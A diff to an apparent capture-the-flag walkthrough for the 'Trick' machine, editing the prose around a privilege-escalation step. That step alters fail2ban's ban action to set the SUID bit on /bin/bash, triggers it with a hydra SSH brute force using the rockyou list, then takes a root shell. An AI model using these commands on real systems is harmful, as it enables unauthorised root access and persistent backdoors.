@@ -603,7 +603,7 @@ actionban = chmod u+s /bin/bash
 #actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
 ```
 
-replace the og file:
+replace the original file:
 
 ```
 michael@trick:~$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
@@ -616,7 +616,8 @@ michael@trick:~$ sudo /etc/init.d/fail2ban restart
 [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
 
-on kali:
+on kali brute force ssh to activate `fail2ban:
+
 ```
 hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -633,6 +634,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-18 09:44:
 ```
 
 ## Root flag
+
+Now /bin/bash has the `SUID` granting a shell as root.
 
 ```
 michael@trick:~$ ls -la /bin/bash
